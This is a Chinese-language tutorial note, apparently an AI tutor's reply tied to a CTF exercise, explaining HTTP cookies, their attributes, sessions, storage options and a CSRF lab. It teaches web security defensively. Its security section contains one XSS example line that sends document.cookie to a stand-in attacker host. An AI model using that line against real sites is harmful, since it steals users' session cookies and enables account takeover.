---
aliases:
tags:
  - CTF
---

1. Cookie 到底是什么
    
2. 它里面通常放什么
    
3. 浏览器和服务器怎么配合工作的
    
4. 底层实现机制
    
5. 常见属性分别是什么意思
    
6. 为什么它能支撑登录态
    
7. 和 Session、localStorage、Token 的区别
    
8. 历史发展
    
9. 安全问题与防御
    
10. 用你刚才的 CSRF 题再串起来理解
    

---

# 1. Cookie 是什么

Cookie 本质上是：

**服务器让浏览器保存的一小段“键值对数据”，以后浏览器再访问同一个网站时，会自动把这段数据带回去。**

你可以把它先想象成：

**网站塞给浏览器的一张小纸条。**

这张纸条上可能写着：

- 你的会话编号
    
- 你的登录状态标识
    
- 站点偏好设置
    
- 语言选项
    
- 购物车 ID
    
- 跟踪标识符
    

然后浏览器会按照一定规则，把这张纸条保存起来。  
以后再访问符合条件的网站时，浏览器就会自动把这张纸条附在 HTTP 请求里一起发出去。

---

# 2. 为什么需要 Cookie

HTTP 协议本身是**无状态**的。

意思是：

服务器默认并不知道下面两次请求是不是同一个人发来的。

比如：

```http
GET / HTTP/1.1
Host: example.com
```

过两秒又来一个：

```http
GET /profile HTTP/1.1
Host: example.com
```

服务器天然并不知道这是不是刚才那个人。  
HTTP 不会自动记住“这个用户刚刚登录过”。

所以 Web 需要一种机制来“记住用户”。Cookie 就是最早、最经典的方案之一。

---

# 3. Cookie 里通常放什么

## 最简单的形式

Cookie 看起来常常像这样：

```http
Cookie: session=abc123
```

这里：

- `session` 是名字
    
- `abc123` 是值
    

也可以有多个：

```http
Cookie: session=abc123; theme=dark; lang=zh-CN
```

## 实际业务里常见内容

### 1）会话 ID

最常见的是：

```text
session=8f3a91b2c7...
```

这通常不是“用户信息本体”，而只是一个随机编号。  
服务器拿到这个编号后，会去自己的数据库或内存里查：

- 这个 session 属于谁
    
- 是否已登录
    
- 权限是什么
    
- 是否过期
    

### 2）用户偏好

例如：

```text
theme=dark
lang=zh-CN
fontSize=large
```

### 3）跟踪或分析标识

例如：

```text
visitor_id=9c1f...
```

### 4）购物车/实验分流

例如：

```text
cart_id=12345
ab_test=B
```

---

# 4. 浏览器和服务器是怎么配合的

Cookie 的工作分两步：

## 第一步：服务器发给浏览器

服务器在响应头里写：

```http
Set-Cookie: session=abc123; Path=/; HttpOnly
```

意思是：

“浏览器，请你保存一个名为 `session` 的 Cookie，值是 `abc123`。”

## 第二步：浏览器以后自动带回来

当浏览器再次访问这个网站，且满足作用域规则时，就会自动在请求头里加上：

```http
Cookie: session=abc123
```

服务器看到这个 Cookie，就可以知道：

“哦，这是刚才登录过的那个会话。”

---

# 5. 一个完整例子

## 用户登录前

浏览器请求登录接口：

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=alice&password=123456
```

## 服务器验证成功后返回

```http
HTTP/1.1 302 Found
Set-Cookie: session=xyz789; Path=/; HttpOnly
Location: /
```

浏览器收到后会保存：

```text
session = xyz789
```

## 之后访问首页

```http
GET / HTTP/1.1
Host: example.com
Cookie: session=xyz789
```

服务器收到 `session=xyz789`，就能查出这个会话对应 `alice`。

---

# 6. Cookie 本身“包含用户信息”吗

不一定。这里很容易误解。

Cookie 有两种常见模式。

## 模式 A：Cookie 里只放一个“会话编号”

这是最常见、最推荐的模式。

例如：

```text
session=4f8c7d9e...
```

真正的用户信息存在服务器端：

- 用户 ID
    
- 登录时间
    
- 权限
    
- 购物车
    
- CSRF token
    
- 过期时间
    

Cookie 只是一个“钥匙编号”。

### 优点

- 浏览器拿不到完整敏感信息
    
- 服务器可以随时失效某个会话
    
- 比较容易做权限控制
    

---

## 模式 B：Cookie 里直接放数据

例如把用户信息编码后直接塞进去：

```text
user=eyJ1aWQiOjEyMywicm9sZSI6InVzZXIifQ==
```

甚至会签名、加密：

```text
auth=SIGNED_OR_ENCRYPTED_BLOB
```

这类做法也存在，尤其在某些无状态架构里。

### 优点

- 服务器不必查会话存储
    
- 横向扩展方便
    

### 缺点

- 设计不好容易被伪造或篡改
    
- 一旦内容过大，会增加每次请求开销
    
- 想让它立即失效更麻烦
    

---

# 7. Cookie 的底层实现是什么样

从浏览器角度看，Cookie 其实就是一张表。

浏览器内部大致会维护类似这样的记录：

|Name|Value|Domain|Path|Expires|Secure|HttpOnly|SameSite|
|---|---|---|---|---|---|---|---|
|session|abc123|example.com|/|会话或时间戳|true|true|Lax|

每条 Cookie 除了名字和值，还有一堆元数据，决定：

- 它发给谁
    
- 什么时候过期
    
- 是否只能 HTTPS 发送
    
- 是否允许 JS 读取
    
- 是否允许跨站带上
    

浏览器在发请求时，会做一次匹配：

1. 当前请求目标域名是什么
    
2. 当前路径是什么
    
3. 是否 HTTPS
    
4. 是顶级导航还是子资源请求
    
5. 是否跨站
    
6. Cookie 是否过期
    
7. 是否符合 SameSite 规则
    

符合条件的 Cookie 才会被拼到 `Cookie` 请求头里。

---

# 8. Cookie 的主要属性分别是什么

这部分非常重要。

## 8.1 Name=Value

最基本的键值对：

```http
Set-Cookie: session=abc123
```

---

## 8.2 Domain

指定哪些域名可以带上这个 Cookie。

例如：

```http
Set-Cookie: session=abc123; Domain=example.com
```

通常表示：

- `example.com`
    
- `www.example.com`
    
- `shop.example.com`
    

这类子域都可能适用。

如果不显式写 `Domain`，通常是更严格的“宿主专属”。

### 这点很关键

Cookie 不是“任何网站都能带”。  
它只会发送给**匹配的域名**。

这也是为什么在你的题里：

- `hacker.localhost` 看不到 `challenge.localhost` 的 Cookie
    
- 但它可以诱导浏览器去请求 `challenge.localhost`
    
- 而浏览器请求 `challenge.localhost` 时，会自动带上属于 `challenge.localhost` 的 Cookie
    

---

## 8.3 Path

指定哪些路径会带这个 Cookie。

例如：

```http
Set-Cookie: session=abc123; Path=/
```

表示整个站点路径都可用。

如果是：

```http
Set-Cookie: adminToken=...; Path=/admin
```

那么通常只会在 `/admin` 下的请求中带上。

---

## 8.4 Expires / Max-Age

控制 Cookie 什么时候过期。

### Session Cookie

如果没有写 `Expires` 或 `Max-Age`，通常是会话级 Cookie。  
一般浏览器关闭后可能失效。

### Persistent Cookie

如果写了：

```http
Set-Cookie: theme=dark; Max-Age=3600
```

表示 1 小时后过期。

或者：

```http
Set-Cookie: theme=dark; Expires=Wed, 21 Oct 2026 07:28:00 GMT
```

表示某个绝对时间过期。

---

## 8.5 Secure

```http
Set-Cookie: session=abc123; Secure
```

表示这个 Cookie 只能通过 **HTTPS** 发送，不能通过明文 HTTP 发送。

这是非常重要的安全属性。

---

## 8.6 HttpOnly

```http
Set-Cookie: session=abc123; HttpOnly
```

表示这个 Cookie **不能被页面里的 JavaScript 读取**。

例如 JS 里：

```javascript
document.cookie
```

读不到 `HttpOnly` Cookie。

### 作用

主要防范 XSS 窃取登录态。  
如果没有 `HttpOnly`，一旦网站存在 XSS，攻击者常常能直接读走 session cookie。

注意：

**HttpOnly 不能阻止 CSRF。**

因为 CSRF 不需要读取 Cookie，只需要浏览器自动带上它。

---

## 8.7 SameSite

这是现代 CSRF 防御里很重要的属性。

### SameSite=Strict

只有同站请求才带 Cookie。  
跨站请求几乎都不带。

最严格，但有时会影响用户体验。

### SameSite=Lax

相对宽松。通常：

- 某些跨站顶级导航 GET 请求可能还能带
    
- 跨站 POST、子资源请求等会更受限
    

很多浏览器默认倾向这个级别。

### SameSite=None

允许跨站发送，但通常必须配合 `Secure`。

### 为什么它重要

因为 CSRF 的关键正是“跨站请求时浏览器自动带上 Cookie”。  
SameSite 就是在这一步加限制。

---

# 9. Cookie 在浏览器里怎么存

不同浏览器实现不同，但本质类似：

- 内存里有当前会话的 Cookie 容器
    
- 磁盘上可能有持久化存储
    
- 每条记录都带元数据
    
- 请求前按规则筛选
    

早年浏览器可能直接存在文本文件里，后面更多用 SQLite 等本地数据库。  
现代浏览器会有更复杂的存储层和隔离机制。

---

# 10. Cookie 在协议层的限制

Cookie 不是无限大的。

通常存在这些现实限制：

- 单个 Cookie 大小有限，常见约 4KB 左右
    
- 每个域名下 Cookie 数量有限
    
- 总存储量有限
    
- 超过限制时会被丢弃、覆盖或清理
    

所以 Cookie 不适合塞大块数据。

这也是为什么真正的业务数据通常不直接放 Cookie，而只是放一个标识符。

---

# 11. Cookie 和 Session 是什么关系

这两个概念经常被混用，但不完全一样。

## Cookie

是**浏览器端保存的一小段数据**。

## Session

通常指**服务器端保存的一段会话状态**。

最典型配合方式是：

1. 服务器创建一个 session 记录
    
2. 生成一个 session ID
    
3. 把这个 session ID 放进 Cookie
    
4. 浏览器以后带着这个 Cookie 来
    
5. 服务器根据 session ID 找到对应会话
    

所以常见说法：

**Cookie 是载体，Session 是状态。**

当然，某些框架也会把签名后的 session 内容直接放 Cookie，这时“session 存在 cookie 中”的味道会更浓。

---

# 12. Cookie 和 localStorage / sessionStorage 的区别

这是前端里常考的横向对比。

## Cookie

- 会自动随 HTTP 请求发给服务器
    
- 容量较小
    
- 可设置 HttpOnly、Secure、SameSite
    
- 适合身份会话、少量状态
    

## localStorage

- 只存在浏览器端
    
- 不会自动随请求发送
    
- JS 可读写
    
- 容量通常比 Cookie 大
    
- 持久化较久
    

## sessionStorage

- 也是浏览器端存储
    
- 不会自动随请求发送
    
- JS 可读写
    
- 生命周期一般跟当前标签页会话有关
    

### 一个非常关键的区别

Cookie 会自动发给服务器，  
而 `localStorage` / `sessionStorage` 不会。

因此：

- 登录会话传统上常用 Cookie
    
- 单页应用有时把 token 放 localStorage，但这会引出 XSS 风险讨论
    

---

# 13. Cookie 和 Token 的区别

这里也很容易混。

## Cookie 不是认证方案本身

Cookie 是一种**浏览器存储与自动回传机制**。

## Token 是认证凭证的形式

例如：

- Session ID
    
- JWT
    
- OAuth access token
    

这些“凭证”可以：

- 放在 Cookie 里
    
- 放在 Authorization 请求头里
    
- 放在 localStorage 里
    
- 放在内存里
    

### 常见组合

#### 方案 A：Session ID + Cookie

传统 Web 很常见。

#### 方案 B：JWT + localStorage

前后端分离项目里常见，但要考虑 XSS。

#### 方案 C：JWT + HttpOnly Cookie

也很常见，安全性和工程复杂度要平衡。

所以不要把 Cookie 和 Token 当成同一层东西。  
更准确地说：

- Cookie 是“运输和存储容器”
    
- Token 是“装进去的身份凭证”
    

---

# 14. Cookie 的发展历史

## 早期背景

HTTP 是无状态协议，90 年代早期的网站开始需要“记住用户”。

比如：

- 登录状态
    
- 购物车
    
- 用户偏好
    

于是浏览器厂商和网站开始寻找一种状态保持机制。

## 诞生

Cookie 的概念在 1990 年代中期逐渐形成，和 Netscape 的早期浏览器生态密切相关。  
后来被标准化进 HTTP 相关规范中。

## 早期问题

早期 Cookie 机制比较粗糙：

- 安全属性少
    
- 隐私意识弱
    
- 第三方跟踪泛滥
    
- CSRF、防会话劫持等问题没有今天这么成熟的配套机制
    

## 后续演进

随着 Web 安全发展，Cookie 不断增加新属性：

- `HttpOnly`
    
- `Secure`
    
- `SameSite`
    

同时浏览器也开始更严格地管理：

- 第三方 Cookie
    
- 跟踪行为
    
- 分区存储
    
- 默认限制跨站发送
    

## 现代趋势

现代浏览器越来越倾向于：

- 限制第三方 Cookie
    
- 强化跨站隔离
    
- 默认更安全的 SameSite 行为
    
- 推动隐私沙箱、分区状态存储等机制
    

所以今天的 Cookie 已经比早年“安全很多”，但也复杂很多。

---

# 15. Cookie 的安全问题

## 15.1 会话劫持

如果攻击者拿到你的 session cookie，他可能就能冒充你。

常见来源：

- 明文 HTTP 被窃听
    
- XSS 读取 Cookie
    
- 恶意扩展
    
- 本地机器被入侵
    
- 日志误泄露
    

### 防护

- HTTPS
    
- `Secure`
    
- `HttpOnly`
    
- 会话过期
    
- 绑定设备/风险控制
    

---

## 15.2 CSRF

你前面刚做过。

因为浏览器会自动带 Cookie，所以攻击者能利用跨站请求诱导浏览器带着登录态去执行操作。

### 防护

- CSRF Token
    
- `SameSite`
    
- 检查 `Origin/Referer`
    
- 敏感操作二次确认
    

---

## 15.3 XSS 窃取 Cookie

如果页面能执行恶意 JS，而 Cookie 又不是 `HttpOnly`，攻击者就可能：

```javascript
fetch("https://attacker.com/steal?c=" + document.cookie)
```

### 防护

- 输出转义
    
- CSP
    
- `HttpOnly`
    
- 严格审计前端输入点
    

---

## 15.4 Cookie 固定攻击

攻击者先给受害者设定一个已知 session ID，受害者登录后继续使用这个 ID，攻击者就能利用这个固定的会话。

### 防护

登录后重新生成 session ID。

---

# 16. 为什么 Cookie 对 CSRF 如此关键

因为 Cookie 的默认行为是：

**浏览器在访问匹配站点时自动携带。**

自动携带这四个字非常关键。

如果每次请求都得用户手动复制凭证，那 CSRF 就很难成立。  
但 Cookie 设计目标就是“自动维持状态”，这极大方便了正常网站，也给 CSRF 留下了攻击面。

---

# 17. 用你的题再串一次

在你的实验里：

1. `admin` 登录了 `challenge.localhost`
    
2. 浏览器保存了该站点的 session cookie
    
3. 受害者浏览器访问 `hacker.localhost`
    
4. 你的恶意页面诱导浏览器请求 `challenge.localhost/publish`
    
5. 浏览器发现目标是 `challenge.localhost`
    
6. 于是自动附带 `challenge.localhost` 的 cookie
    
7. 服务端看到有效 session，以为是 admin 自己操作
    
8. admin 的草稿被发布
    

所以 CSRF 的真正依赖点，不是“攻击者知道 Cookie 内容”，而是：

**攻击者知道浏览器会自动带上它。**

---

# 18. 一个直观比喻

把 Cookie 想成酒店手环会比较好懂。

- 你入住酒店时，前台给你一个手环
    
- 手环上未必写着你的全部信息，可能只是一个编号
    
- 你去健身房、泳池、餐厅时，工作人员看到手环，就知道你是住客
    

这里：

- 酒店前台 = 服务器
    
- 手环 = Cookie
    
- 手环编号对应的住客记录 = Session
    
- 你每次进门自动展示手环 = 浏览器自动带 Cookie
    

CSRF 就像有人骗你去刷一下某个门禁，门禁系统只认手环，不确认是不是你本人自愿刷的。

---

# 19. 新手最该记住的几句话

第一句：

**Cookie 是服务器让浏览器保存、并在后续请求中自动回传的一小段状态数据。**

第二句：

**Cookie 最常见用途是承载登录会话标识。**

第三句：

**Cookie 本身不一定包含完整用户信息，很多时候只是一个 session ID。**

第四句：

**Cookie 自动发送这个特性，既让登录态变方便，也导致了 CSRF 风险。**

第五句：

**HttpOnly 防 XSS 读 Cookie，SameSite 防跨站自动带 Cookie，Secure 防明文传输泄露。**

---

# 20. 给你一个结构化对比表

|机制|存在哪里|会自动随请求发送吗|JS 能读吗|典型用途|
|---|---|--:|--:|---|
|Cookie|浏览器|会|视 HttpOnly 而定|登录态、偏好、小型状态|
|Session|服务器|不直接发送|不适用|服务端会话状态|
|localStorage|浏览器|不会|能|前端缓存、非敏感状态|
|sessionStorage|浏览器|不会|能|当前标签页临时状态|
|Token|取决于存储位置|取决于发送方式|取决于存储位置|认证凭证|

---

# 21. 一点更底层的理解

从工程视角看，Cookie 其实是 HTTP 协议层的一个“状态扩展机制”。

HTTP 本来是“请求来了就处理，处理完就结束”。  
Cookie 相当于给它增加了一种能力：

- 服务器能把状态提示写给客户端
    
- 客户端以后能按规则自动带回
    
- 服务器就能把一次次独立请求串起来，形成“连续会话”的效果
    

所以 Cookie 的本质，不只是“浏览器小文本”，而是：

**Web 从无状态走向有状态交互的关键基础设施之一。**

---

你要是愿意，我下一条可以继续给你讲：  
**“浏览器到底是怎么判断同站、同源、跨站的，为什么 Cookie 的 SameSite 和 SOP 不是一回事”**。